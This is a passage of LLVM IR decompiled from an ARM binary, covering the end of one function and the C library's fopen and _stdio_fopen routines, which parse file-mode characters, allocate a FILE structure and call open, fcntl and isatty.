dec_label_pc_17af8:                               ; preds = %dec_label_pc_17ac8, %dec_label_pc_17ae0.dec_label_pc_17ad4_crit_edge, %dec_label_pc_17af4
  %v0_17b00 = phi i32 [ %v0_17af4, %dec_label_pc_17af4 ], [ %v2_17ad464, %dec_label_pc_17ac8 ], [ %v2_17ad4, %dec_label_pc_17ae0.dec_label_pc_17ad4_crit_edge ]
  %v1_17af8 = phi i32 [ %v0_17af4, %dec_label_pc_17af4 ], [ %v2_17ac8, %dec_label_pc_17ac8 ], [ %v1_17ad8.pre, %dec_label_pc_17ae0.dec_label_pc_17ad4_crit_edge ]
  %v3_17af8 = icmp uge i32 %v0_17b00, %v1_17af8
  store i1 %v3_17af8, i1* %cpsr_c.global-to-local, align 1
  %v9_17af8 = icmp eq i32 %v0_17b00, %v1_17af8
  br i1 %v9_17af8, label %dec_label_pc_17b00, label %dec_label_pc_17af8.dec_label_pc_17ac8_crit_edge

dec_label_pc_17af8.dec_label_pc_17ac8_crit_edge:  ; preds = %dec_label_pc_17af8
  %v0_17ac8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ac8

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17af8
  %v2_17b00 = icmp ne i32 %v1_17af8, 0
  store i1 %v2_17b00, i1* %cpsr_c.global-to-local, align 1
  %v7_17b04 = icmp slt i32 %v1_17af8, 2
  br i1 %v7_17b04, label %dec_label_pc_17b20, label %dec_label_pc_17b08

dec_label_pc_17b08:                               ; preds = %dec_label_pc_17b00
  %v0_17b08 = load i32, i32* @r5, align 4
  store i32 %v0_17b08, i32* %r0.global-to-local, align 4
  %v0_17b0c = load i32, i32* %r1.global-to-local, align 4
  %v1_17b0c = add i32 %v0_17b0c, 129
  store i32 %v1_17b0c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17b20

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17a98, %dec_label_pc_17b08, %dec_label_pc_17b00
  %v0_17b20 = call i32 @_stdio_openlist_dec_use()
  %v0_17b24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17b24, i32* %r0.global-to-local, align 4
  %v2_17b2c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17b2c, i32* @r4, align 4
  store i32 %v6_17814, i32* @r5, align 4
  store i32 %v9_17814, i32* @r6, align 4
  store i32 %v12_17814, i32* @r7, align 4
  ret i32 %v0_17b24

; uselistorder directives
  uselistorder i32 %v0_17af4, { 1, 0, 2 }
  uselistorder i32 %v1_17ad8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17ac8, { 1, 0 }
  uselistorder i32 %v0_17a9c, { 1, 0 }
  uselistorder i32 %v0_17a84, { 1, 0, 2 }
  uselistorder i32 %v1_17a68.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17a50, { 1, 0 }
  uselistorder i32 %v0_17a08, { 1, 0, 2 }
  uselistorder i32 %v1_179ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1797c, { 1, 0, 2 }
  uselistorder i32 %v1_17960.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17950, { 1, 0 }
  uselistorder i32 %v0_1790c, { 1, 0, 2 }
  uselistorder i32 %v1_178f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_178d0, { 1, 0 }
  uselistorder i32 %v1_1785c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 30, 29, 34, 33, 28, 32, 31, 27, 26, 25, 24, 23, 9, 8, 7, 6, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 0, 5, 4, 3 }
  uselistorder label %dec_label_pc_17b20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17af8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ae0, { 1, 0 }
  uselistorder label %dec_label_pc_17a98, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_17a88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a70, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_17a34, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_17a0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_179f4, { 1, 0 }
  uselistorder label %dec_label_pc_179a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17980, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17968, { 1, 0 }
  uselistorder label %dec_label_pc_17920, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_17910, { 2, 1, 0 }
  uselistorder label %dec_label_pc_178f8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_17898, { 1, 0 }
  uselistorder label %dec_label_pc_1788c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1787c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17864, { 1, 0 }
}

define i32 @function_17b38(i32 %arg1) local_unnamed_addr {
dec_label_pc_17b38:
  %v0_17b38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17b38, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17b38
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17b38, %bb
  %v10_17b40 = phi i32 [ %arg1, %dec_label_pc_17b38 ], [ 0, %bb ]
  ret i32 %v10_17b40

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_17b54 = call i32 @_stdio_fopen()
  ret i32 %v0_17b54
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17b64 = load i32, i32* @r4, align 4
  store i32 %v3_17b64, i32* %stack_var_-24, align 4
  %v6_17b64 = load i32, i32* @r5, align 4
  %v9_17b64 = load i32, i32* @r6, align 4
  %v12_17b64 = load i32, i32* @r7, align 4
  %v15_17b64 = load i32, i32* @r8, align 4
  %v0_17b68 = load i32, i32* @r1, align 4
  %v1_17b68 = inttoptr i32 %v0_17b68 to i8*
  %v2_17b68 = load i8, i8* %v1_17b68, align 1
  %v2_17b70 = icmp ugt i8 %v2_17b68, 113
  store i1 %v2_17b70, i1* %cpsr_c.global-to-local, align 1
  %v7_17b70 = icmp eq i8 %v2_17b68, 114
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r8, align 4
  %v0_17b7c = load i32, i32* @r0, align 4
  store i32 %v0_17b7c, i32* @r7, align 4
  %v0_17b80 = load i32, i32* @r2, align 4
  store i32 %v0_17b80, i32* @r5, align 4
  %v0_17b84 = load i32, i32* @r3, align 4
  store i32 %v0_17b84, i32* @r6, align 4
  br i1 %v7_17b70, label %dec_label_pc_17bd8, label %dec_label_pc_17b8c

dec_label_pc_17b8c:                               ; preds = %entry
  %v2_17b8c = icmp ugt i8 %v2_17b68, 118
  store i1 %v2_17b8c, i1* %cpsr_c.global-to-local, align 1
  %v7_17b8c = icmp eq i8 %v2_17b68, 119
  br i1 %v7_17b8c, label %bb, label %dec_label_pc_17b98

bb:                                               ; preds = %dec_label_pc_17b8c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_17bdc

dec_label_pc_17b98:                               ; preds = %dec_label_pc_17b8c
  %v2_17b98 = icmp ugt i8 %v2_17b68, 96
  store i1 %v2_17b98, i1* %cpsr_c.global-to-local, align 1
  %v7_17b98 = icmp eq i8 %v2_17b68, 97
  br i1 %v7_17b98, label %bb50, label %dec_label_pc_17ba4

bb50:                                             ; preds = %dec_label_pc_17b98
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_17bdc

dec_label_pc_17ba4:                               ; preds = %dec_label_pc_17b98, %dec_label_pc_17c74, %dec_label_pc_17c48
  store i32 51484, i32* %r2.global-to-local, align 4
  %v0_17ba8 = call i32 @__aeabi_read_tp()
  store i32 %v0_17ba8, i32* %r0.global-to-local, align 4
  %v3_17bac = load i16, i16* @global_var_244d0.762, align 2
  %v4_17bac = sext i16 %v3_17bac to i32
  store i32 %v4_17bac, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_17bb4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17bb4 = icmp eq i32 %v0_17bb4, 0
  %v3_17bb8 = add i32 %v4_17bac, %v0_17ba8
  %v4_17bb8 = inttoptr i32 %v3_17bb8 to i32*
  store i32 22, i32* %v4_17bb8, align 4
  br i1 %v2_17bb4, label %dec_label_pc_17f7c, label %dec_label_pc_17bc0

dec_label_pc_17bc0:                               ; preds = %dec_label_pc_17c98._crit_edge, %dec_label_pc_17ba4
  %v0_17bc0 = load i32, i32* @r5, align 4
  %v1_17bc0 = inttoptr i32 %v0_17bc0 to i16*
  %v2_17bc0 = load i16, i16* %v1_17bc0, align 2
  %v3_17bc0 = zext i16 %v2_17bc0 to i32
  store i32 %v3_17bc0, i32* %r3.global-to-local, align 4
  %v1_17bc4 = and i32 %v3_17bc0, 8192
  %v2_17bc4 = icmp eq i32 %v1_17bc4, 0
  br i1 %v2_17bc4, label %dec_label_pc_17f7c, label %dec_label_pc_17bcc

dec_label_pc_17bcc:                               ; preds = %dec_label_pc_17bc0
  store i32 %v0_17bc0, i32* @r0, align 4
  %v0_17bd0 = call i32 @free()
  store i32 %v0_17bd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f7c

dec_label_pc_17bd8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_17bdc

dec_label_pc_17bdc:                               ; preds = %bb, %bb50, %dec_label_pc_17bd8
  %v1_17bf4 = phi i32 [ 1089, %bb50 ], [ 577, %bb ], [ 1, %dec_label_pc_17bd8 ]
  %v1_17bdc = add i32 %v0_17b68, 1
  %v2_17bdc = inttoptr i32 %v1_17bdc to i8*
  %v3_17bdc = load i8, i8* %v2_17bdc, align 1
  %v2_17be0 = icmp ugt i8 %v3_17bdc, 97
  store i1 %v2_17be0, i1* %cpsr_c.global-to-local, align 1
  %v7_17be0 = icmp eq i8 %v3_17bdc, 98
  %v1_17bdc.v0_17b68 = select i1 %v7_17be0, i32 %v1_17bdc, i32 %v0_17b68
  store i32 %v1_17bdc.v0_17b68, i32* %r3.global-to-local, align 4
  %v1_17bec = add i32 %v1_17bdc.v0_17b68, 1
  %v2_17bec = inttoptr i32 %v1_17bec to i8*
  %v3_17bec = load i8, i8* %v2_17bec, align 1
  %v4_17bec = zext i8 %v3_17bec to i32
  store i32 %v4_17bec, i32* @r3, align 4
  %v2_17bf0 = icmp ugt i8 %v3_17bec, 42
  store i1 %v2_17bf0, i1* %cpsr_c.global-to-local, align 1
  %v7_17bf0 = icmp eq i8 %v3_17bec, 43
  br i1 %v7_17bf0, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_17bdc
  store i32 %v1_17bf4, i32* @r3, align 4
  %v2_17bf8 = add nuw nsw i32 %v1_17bf4, 1
  store i32 %v2_17bf8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17bdc, %bb53
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17bfc = icmp eq i32 %v0_17b80, 0
  br i1 %v2_17bfc, label %dec_label_pc_17c04, label %dec_label_pc_17c40

dec_label_pc_17c04:                               ; preds = %.thread4
  store i32 68, i32* @r0, align 4
  %v0_17c08 = call i32 @malloc()
  store i32 %v0_17c08, i32* %r0.global-to-local, align 4
  store i32 %v0_17c08, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_17c0c = icmp eq i32 %v0_17c08, 0
  br i1 %v3_17c0c, label %dec_label_pc_17f80, label %dec_label_pc_17c14

dec_label_pc_17c14:                               ; preds = %dec_label_pc_17c04
  %v0_17c18 = load i32, i32* @r8, align 4
  %v2_17c18 = add i32 %v0_17c18, -33136
  store i32 %v2_17c18, i32* %r3.global-to-local, align 4
  %v1_17c1c = inttoptr i32 %v2_17c18 to i32*
  %v2_17c1c = load i32, i32* %v1_17c1c, align 4
  store i32 %v2_17c1c, i32* %r0.global-to-local, align 4
  %v3_17c1c = add i32 %v0_17c18, -33132
  %v4_17c1c = inttoptr i32 %v3_17c1c to i32*
  %v5_17c1c = load i32, i32* %v4_17c1c, align 4
  store i32 %v5_17c1c, i32* @r1, align 4
  %v6_17c1c = add i32 %v0_17c18, -33128
  %v7_17c1c = inttoptr i32 %v6_17c1c to i32*
  %v8_17c1c = load i32, i32* %v7_17c1c, align 4
  store i32 %v8_17c1c, i32* %r2.global-to-local, align 4
  %v2_17c28 = add i32 %v0_17c08, 8
  %v3_17c28 = inttoptr i32 %v2_17c28 to i32*
  store i32 0, i32* %v3_17c28, align 4
  %v2_17c30 = load i32, i32* @r5, align 4
  %v3_17c30 = inttoptr i32 %v2_17c30 to i16*
  store i16 8192, i16* %v3_17c30, align 2
  %v2_17c34 = load i32, i32* %r0.global-to-local, align 4
  %v0_17c38 = load i32, i32* @r5, align 4
  %v1_17c38 = add i32 %v0_17c38, 56
  store i32 %v1_17c38, i32* @r3, align 4
  %v1_17c3c = inttoptr i32 %v1_17c38 to i32*
  store i32 %v2_17c34, i32* %v1_17c3c, align 4
  %v3_17c3c = add i32 %v0_17c38, 60
  %v4_17c3c = inttoptr i32 %v3_17c3c to i32*
  %v5_17c3c = load i32, i32* @r1, align 4
  store i32 %v5_17c3c, i32* %v4_17c3c, align 4
  %v6_17c3c = add i32 %v0_17c38, 64
  %v7_17c3c = inttoptr i32 %v6_17c3c to i32*
  %v8_17c3c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17c3c, i32* %v7_17c3c, align 4
  %v0_17c40.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17c40

dec_label_pc_17c40:                               ; preds = %.thread4, %dec_label_pc_17c14
  %v0_17c98 = phi i32 [ %v0_17b84, %.thread4 ], [ %v0_17c40.pre, %dec_label_pc_17c14 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17c40 = icmp slt i32 %v0_17c98, 0
  br i1 %v1_17c40, label %dec_label_pc_17c98, label %dec_label_pc_17c48

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c40
  %v0_17c4c = load i32, i32* @r4, align 4
  %v2_17c4c = and i32 %v0_17c4c, 131075
  %v1_17c50 = add nuw nsw i32 %v2_17c4c, 1
  store i32 %v1_17c50, i32* %r2.global-to-local, align 4
  %v0_17c54 = load i32, i32* @r7, align 4
  %v1_17c54 = add i32 %v0_17c54, 1
  %v2_17c58 = and i32 %v1_17c54, %v1_17c50
  store i32 %v2_17c58, i32* %r3.global-to-local, align 4
  %v3_17c5c = icmp uge i32 %v2_17c58, %v1_17c50
  store i1 %v3_17c5c, i1* %cpsr_c.global-to-local, align 1
  %v9_17c5c = icmp eq i32 %v2_17c58, %v1_17c50
  %v1_17c60 = load i32, i32* @r5, align 4
  %v2_17c60 = add i32 %v1_17c60, 4
  %v3_17c60 = inttoptr i32 %v2_17c60 to i32*
  store i32 %v0_17c98, i32* %v3_17c60, align 4
  br i1 %v9_17c5c, label %dec_label_pc_17c68, label %dec_label_pc_17ba4

dec_label_pc_17c68:                               ; preds = %dec_label_pc_17c48
  %v0_17c68 = load i32, i32* @r4, align 4
  %v1_17c68 = load i32, i32* @r7, align 4
  %v2_17c68 = sub i32 -1, %v1_17c68
  %v3_17c68 = and i32 %v0_17c68, %v2_17c68
  store i32 %v3_17c68, i32* @r3, align 4
  %v1_17c6c = and i32 %v3_17c68, 1024
  %v2_17c6c = icmp eq i32 %v1_17c6c, 0
  br i1 %v2_17c6c, label %dec_label_pc_17c8c, label %dec_label_pc_17c74

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17c68
  %v0_17c74 = load i32, i32* @r6, align 4
  store i32 %v0_17c74, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_17c80 = call i32 @__libc_fcntl(i32 %v0_17c74, i32 4)
  store i32 %v2_17c80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17c84 = icmp eq i32 %v2_17c80, 0
  br i1 %v2_17c84, label %dec_label_pc_17c74.dec_label_pc_17c8c_crit_edge, label %dec_label_pc_17ba4

dec_label_pc_17c74.dec_label_pc_17c8c_crit_edge:  ; preds = %dec_label_pc_17c74
  %v0_17c8c.pre = load i32, i32* @r7, align 4
  %v0_17c90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17c8c

dec_label_pc_17c8c:                               ; preds = %dec_label_pc_17c74.dec_label_pc_17c8c_crit_edge, %dec_label_pc_17c68
  %v0_17c90 = phi i32 [ %v0_17c90.pre, %dec_label_pc_17c74.dec_label_pc_17c8c_crit_edge ], [ %v0_17c68, %dec_label_pc_17c68 ]
  %v0_17c8c = phi i32 [ %v0_17c8c.pre, %dec_label_pc_17c74.dec_label_pc_17c8c_crit_edge ], [ %v1_17c68, %dec_label_pc_17c68 ]
  %v1_17c8c = and i32 %v0_17c8c, 131072
  store i32 %v1_17c8c, i32* %r3.global-to-local, align 4
  %v2_17c90 = or i32 %v1_17c8c, %v0_17c90
  store i32 %v2_17c90, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17cbc

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c40
  %v2_17c98 = icmp eq i32 %v0_17c98, -1
  store i1 %v2_17c98, i1* %cpsr_c.global-to-local, align 1
  %v7_17c98 = icmp eq i32 %v0_17c98, -1
  %v0_17ca4.pre = load i32, i32* @r4, align 4
  br i1 %v7_17c98, label %dec_label_pc_17c98._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_17c98
  %v2_17c9c = or i32 %v0_17ca4.pre, 131072
  store i32 %v2_17c9c, i32* @r4, align 4
  br label %dec_label_pc_17c98._crit_edge

dec_label_pc_17c98._crit_edge:                    ; preds = %dec_label_pc_17c98, %bb54
  %v0_17ca4 = phi i32 [ %v2_17c9c, %bb54 ], [ %v0_17ca4.pre, %dec_label_pc_17c98 ]
  %v0_17ca0 = load i32, i32* @r7, align 4
  store i32 %v0_17ca0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_17cac = inttoptr i32 %v0_17ca4 to i64*
  %v3_17cac = call i32 @__libc_open(i32 %v0_17ca0, i64* %v2_17cac)
  store i32 %v3_17cac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17cb0 = icmp slt i32 %v3_17cac, 0
  %v1_17cb4 = load i32, i32* @r5, align 4
  %v2_17cb4 = add i32 %v1_17cb4, 4
  %v3_17cb4 = inttoptr i32 %v2_17cb4 to i32*
  store i32 %v3_17cac, i32* %v3_17cb4, align 4
  br i1 %v1_17cb0, label %dec_label_pc_17bc0, label %.dec_label_pc_17cbc_crit_edge

.dec_label_pc_17cbc_crit_edge:                    ; preds = %dec_label_pc_17c98._crit_edge
  %v0_17cc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17cbc

dec_label_pc_17cbc:                               ; preds = %.dec_label_pc_17cbc_crit_edge, %dec_label_pc_17c8c
  %v0_17cd8 = phi i32 [ %v0_17cc0.pre, %.dec_label_pc_17cbc_crit_edge ], [ %v2_17c90, %dec_label_pc_17c8c ]
  %v0_17cbc = load i32, i32* @r5, align 4
  %v1_17cbc = inttoptr i32 %v0_17cbc to i16*
  %v2_17cbc = load i16, i16* %v1_17cbc, align 2
  %v3_17cbc = zext i16 %v2_17cbc to i32
  %v1_17cc0 = urem i32 %v0_17cd8, 4
  %v1_17cc4 = and i32 %v0_17cd8, 1024
  %v1_17cc8 = and i32 %v3_17cbc, 8192
  %v1_17ccc = add nuw nsw i32 %v1_17cc0, 1
  %v2_17cd0 = or i32 %v1_17cc8, %v1_17cc4
  store i32 %v2_17cd0, i32* %r3.global-to-local, align 4
  %v1_17cd4 = xor i32 %v1_17ccc, 3
  %v1_17cd8 = and i32 %v0_17cd8, 131072
  store i32 %v1_17cd8, i32* %r2.global-to-local, align 4
  %v2_17cd8 = icmp eq i32 %v1_17cd8, 0
  %v1_17cdc = add i32 %v0_17cbc, 4
  %v2_17cdc = inttoptr i32 %v1_17cdc to i32*
  %v3_17cdc = load i32, i32* %v2_17cdc, align 4
  store i32 %v3_17cdc, i32* @r4, align 4
  br i1 %v2_17cd8, label %bb56, label %bb55

bb55:                                             ; preds = %dec_label_pc_17cbc
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_17cbc, %bb55
  %v0_17ce8 = phi i32 [ 0, %dec_label_pc_17cbc ], [ 32768, %bb55 ]
  %v4_17ce4 = mul nuw nsw i32 %v1_17cd4, 16
  %v5_17ce4 = or i32 %v2_17cd0, %v4_17ce4
  store i32 %v5_17ce4, i32* %r3.global-to-local, align 4
  %v2_17ce8 = or i32 %v0_17ce8, %v5_17ce4
  store i32 %v2_17ce8, i32* %r2.global-to-local, align 4
  %v2_17cec = icmp ugt i32 %v3_17cdc, 2147483646
  store i1 %v2_17cec, i1* %cpsr_c.global-to-local, align 1
  %v8_17cec = icmp eq i32 %v3_17cdc, 2147483647
  %v1_17cf0 = trunc i32 %v2_17ce8 to i16
  store i16 %v1_17cf0, i16* %v1_17cbc, align 2
  br i1 %v8_17cec, label %dec_label_pc_17d30, label %dec_label_pc_17cf8

dec_label_pc_17cf8:                               ; preds = %bb56
  store i32 51144, i32* %r3.global-to-local, align 4
  %v0_17cfc = call i32 @__aeabi_read_tp()
  %v3_17d00 = load i16, i16* @global_var_244d0.762, align 2
  %v4_17d00 = sext i16 %v3_17d00 to i32
  store i32 %v4_17d00, i32* @r3, align 4
  store i32 %v0_17cfc, i32* @r6, align 4
  %v0_17d08 = load i32, i32* @r4, align 4
  store i32 %v0_17d08, i32* @r0, align 4
  %v2_17d0c = add i32 %v4_17d00, %v0_17cfc
  %v3_17d0c = inttoptr i32 %v2_17d0c to i32*
  %v4_17d0c = load i32, i32* %v3_17d0c, align 4
  store i32 %v4_17d0c, i32* @r4, align 4
  %v1_17d10 = call i32 @isatty(i32 %v0_17d08)
  store i32 %v1_17d10, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d14 = icmp eq i32 %v1_17d10, 0
  br i1 %v2_17d14, label %.thread6, label %bb57

bb57:                                             ; preds = %dec_label_pc_17cf8
  %v1_17d18 = load i32, i32* @r5, align 4
  %v2_17d18 = inttoptr i32 %v1_17d18 to i16*
  %v3_17d18 = load i16, i16* %v2_17d18, align 2
  %v4_17d18 = zext i16 %v3_17d18 to i32
  %v2_17d1c = or i32 %v4_17d18, 256
  store i32 %v2_17d1c, i32* %r3.global-to-local, align 4
  %v2_17d20 = trunc i32 %v2_17d1c to i16
  store i16 %v2_17d20, i16* %v2_17d18, align 2
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17cf8, %bb57
  %v3_17d28 = load i16, i16* @global_var_244d0.762, align 2
  %v4_17d28 = sext i16 %v3_17d28 to i32
  store i32 %v4_17d28, i32* %r3.global-to-local, align 4
  %v0_17d2c = load i32, i32* @r4, align 4
  %v1_17d2c = load i32, i32* @r6, align 4
  %v3_17d2c = add i32 %v1_17d2c, %v4_17d28
  %v4_17d2c = inttoptr i32 %v3_17d2c to i32*
  store i32 %v0_17d2c, i32* %v4_17d2c, align 4
  br label %dec_label_pc_17d30

dec_label_pc_17d30:                               ; preds = %bb56, %.thread6
  %v0_17d30 = load i32, i32* @r5, align 4
  %v1_17d30 = add i32 %v0_17d30, 8
  %v2_17d30 = inttoptr i32 %v1_17d30 to i32*
  %v3_17d30 = load i32, i32* %v2_17d30, align 4
  store i32 %v3_17d30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d34 = icmp eq i32 %v3_17d30, 0
  br i1 %v2_17d34, label %dec_label_pc_17d3c, label %bb58

dec_label_pc_17d3c:                               ; preds = %dec_label_pc_17d30
  store i32 4096, i32* @r0, align 4
  %v0_17d40 = call i32 @malloc()
  store i32 %v0_17d40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d44 = icmp eq i32 %v0_17d40, 0
  %v1_17d54.pre = load i32, i32* @r5, align 4
  br i1 %v2_17d44, label %.thread10, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17d3c
  %v2_17d48 = inttoptr i32 %v1_17d54.pre to i16*
  %v3_17d48 = load i16, i16* %v2_17d48, align 2
  %v4_17d48 = zext i16 %v3_17d48 to i32
  %v2_17d4c = add i32 %v0_17d40, 4096
  store i32 %v2_17d4c, i32* %r2.global-to-local, align 4
  %v2_17d50 = or i32 %v4_17d48, 16384
  store i32 %v2_17d50, i32* %r3.global-to-local, align 4
  %v2_17d54 = add i32 %v1_17d54.pre, 8
  %v3_17d54 = inttoptr i32 %v2_17d54 to i32*
  store i32 %v0_17d40, i32* %v3_17d54, align 4
  %v1_17d58 = load i32, i32* %r2.global-to-local, align 4
  %v2_17d58 = load i32, i32* @r5, align 4
  %v3_17d58 = add i32 %v2_17d58, 12
  %v4_17d58 = inttoptr i32 %v3_17d58 to i32*
  store i32 %v1_17d58, i32* %v4_17d58, align 4
  %v1_17d5c = load i32, i32* %r3.global-to-local, align 4
  %v2_17d5c = trunc i32 %v1_17d5c to i16
  %v3_17d5c = load i32, i32* @r5, align 4
  %v4_17d5c = inttoptr i32 %v3_17d5c to i16*
  store i16 %v2_17d5c, i16* %v4_17d5c, align 2
  br label %bb58

.thread10:                                        ; preds = %dec_label_pc_17d3c
  %v2_17d5438 = add i32 %v1_17d54.pre, 8
  %v3_17d5439 = inttoptr i32 %v2_17d5438 to i32*
  store i32 0, i32* %v3_17d5439, align 4
  %v2_17d60 = load i32, i32* @r5, align 4
  %v3_17d60 = add i32 %v2_17d60, 12
  %v4_17d60 = inttoptr i32 %v3_17d60 to i32*
  store i32 0, i32* %v4_17d60, align 4
  br label %bb58

bb58:                                             ; preds = %.thread9, %dec_label_pc_17d30, %.thread10
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_17d6c = load i32, i32* @r8, align 4
  %v2_17d6c = add i32 %v0_17d6c, 92
  %v3_17d6c = inttoptr i32 %v2_17d6c to i32*
  %v4_17d6c = load i32, i32* %v3_17d6c, align 4
  store i32 %v4_17d6c, i32* %r3.global-to-local, align 4
  %v2_17d70 = load i32, i32* @r5, align 4
  %v3_17d70 = add i32 %v2_17d70, 2
  %v4_17d70 = inttoptr i32 %v3_17d70 to i8*
  store i8 0, i8* %v4_17d70, align 1
  %v0_17d74 = load i32, i32* @r5, align 4
  %v1_17d74 = inttoptr i32 %v0_17d74 to i16*
  %v2_17d74 = load i16, i16* %v1_17d74, align 2
  %v3_17d74 = zext i16 %v2_17d74 to i32
  store i32 %v3_17d74, i32* %r2.global-to-local, align 4
  %v0_17d78 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d78 = inttoptr i32 %v0_17d78 to i32*
  %v2_17d78 = load i32, i32* %v1_17d78, align 4
  store i32 %v2_17d78, i32* @r1, align 4
  %v1_17d7c = add i32 %v0_17d74, 8
  %v2_17d7c = inttoptr i32 %v1_17d7c to i32*
  %v3_17d7c = load i32, i32* %v2_17d7c, align 4
  store i32 %v3_17d7c, i32* %r3.global-to-local, align 4
  %v1_17d80 = and i32 %v3_17d74, 8192
  %v2_17d80 = icmp eq i32 %v1_17d80, 0
  %v2_17d84 = add i32 %v0_17d74, 20
  %v3_17d84 = inttoptr i32 %v2_17d84 to i32*
  store i32 %v3_17d7c, i32* %v3_17d84, align 4
  %v0_17d88 = load i32, i32* @r1, align 4
  %v1_17d88 = load i32, i32* @r5, align 4
  %v2_17d88 = add i32 %v1_17d88, 52
  %v3_17d88 = inttoptr i32 %v2_17d88 to i32*
  store i32 %v0_17d88, i32* %v3_17d88, align 4
  %v0_17d8c = load i32, i32* %r3.global-to-local, align 4
  %v1_17d8c = load i32, i32* @r5, align 4
  %v2_17d8c = add i32 %v1_17d8c, 24
  %v3_17d8c = inttoptr i32 %v2_17d8c to i32*
  store i32 %v0_17d8c, i32* %v3_17d8c, align 4
  %v0_17d90 = load i32, i32* %r3.global-to-local, align 4
